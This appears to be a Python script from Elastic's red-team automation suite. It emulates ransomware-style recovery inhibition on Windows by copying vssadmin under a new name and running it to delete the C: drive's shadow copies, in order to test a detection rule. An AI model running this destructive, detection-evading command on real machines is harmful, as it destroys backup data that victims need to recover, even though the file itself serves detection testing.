# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="5fe84989-d544-4a7b-9fbf-0e30d86c09ce",
    name="inhibit_system_recovery_renamed",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        RuleMetadata(id="153f52e2-2fe5-420b-8691-ddb8562b99d7", name="Inhibit System Recovery via Renamed Utilities")
    ],
    siem_rules=[],
    techniques=["T1490", "T1218"],
)
def main():
    vssadmin = "C:\\Windows\\System32\\vssadmin.exe"
    ren_vssadmin = "C:\\Users\\Public\\renvssadmin.exe"

    _common.copy_file(vssadmin, ren_vssadmin)
    # Execute command
    log.info("Deleting Shadow Copies using a renamed Vssadmin")
    _ = _common.execute_command([ren_vssadmin, "delete", "shadows", "/For=C:"], timeout_secs=10)
    _common.remove_file(ren_vssadmin)
